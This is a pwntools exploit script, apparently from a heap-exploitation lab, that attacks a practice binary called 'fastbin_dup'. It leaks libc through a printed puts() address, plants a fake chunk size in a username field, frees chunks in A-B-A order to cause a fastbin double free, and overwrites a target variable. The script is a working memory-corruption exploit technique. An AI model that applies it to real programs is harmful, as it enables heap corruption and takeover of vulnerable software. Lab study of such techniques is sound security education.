#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again
context.terminal = ['qterminal', '-e', '/usr/bin/python3']

gs = '''
init-pwndbg
'''
# continue


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0


# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
# This is to avoid memory corrupton issues. The 0x31 is there to provide a size field for the new heap we have allocated in the end
username = p64(0) + p64(0x31)
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b"A" * 0x28)
chunk_B = malloc(0x28, b"B" * 0x28)

# Free the first chunk, then the second.
# This causes a double-free situation without malloc throwing errors.
# The error happens when the top of the fastbins linked list being freed is the same as the last chunk freed.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Now in the fastbins linked list, chunk A points to the user struct. Thus, we have a circular linked list
malloc(0x28, p64(elf.sym.user))

# We allocate two chunks to span the space of the two allocations of A and B
malloc(0x28, "X")
malloc(0x28, "X")

# Then we finally write over the target variable (this is after the p64(0) + p64(0x31) as metadata to this chunk)
malloc(0x28, "gotcha")
# =============================================================================

io.interactive()
